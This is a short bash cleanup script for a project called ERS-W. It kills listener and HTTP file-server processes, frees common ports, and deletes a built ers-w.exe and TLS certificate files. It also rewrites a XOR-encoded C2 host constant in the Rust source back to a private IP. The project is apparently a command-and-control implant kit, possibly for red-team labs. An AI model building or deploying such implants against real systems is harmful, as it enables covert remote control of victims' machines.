#!/bin/bash
# ─────────────────────────────────────────────────────────────
# ERS-W Cleanup — kills all processes, frees ports, cleans artifacts
# Usage: bash cleanup.sh          (normal)
#        sudo bash cleanup.sh     (if processes were started as root)
# ─────────────────────────────────────────────────────────────

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

DIR="$(cd "$(dirname "$0")" && pwd)"

echo -e "${CYAN}[*]${NC} Killing listeners..."
pkill -9 -f 'listener.py' 2>/dev/null
pkill -9 -f 'python3.*listener' 2>/dev/null

echo -e "${CYAN}[*]${NC} Killing file servers..."
pkill -9 -f 'http.server' 2>/dev/null
pkill -9 -f 'SimpleHTTP' 2>/dev/null

echo -e "${CYAN}[*]${NC} Freeing ports..."
fuser -k 443/tcp 2>/dev/null
fuser -k 4443/tcp 2>/dev/null
fuser -k 8080/tcp 2>/dev/null
fuser -k 8443/tcp 2>/dev/null

echo -e "${CYAN}[*]${NC} Cleaning build artifacts..."
rm -f "$DIR/ers-w.exe" 2>/dev/null
rm -f "$DIR/cert.pem" "$DIR/key.pem" 2>/dev/null
rm -rf "$DIR/target" 2>/dev/null

echo -e "${CYAN}[*]${NC} Resetting source to default IP..."
sed -i 's|const ENC_C2_HOST: \[u8; [0-9]*\] = xor_encode(b"[^"]*");|const ENC_C2_HOST: [u8; 15] = xor_encode(b"192.168.1.100  ");|' "$DIR/src/main.rs" 2>/dev/null

echo -e "\n${GREEN}[+] Done — everything cleaned. Run 'sudo bash setup.sh' for fresh start.${NC}"
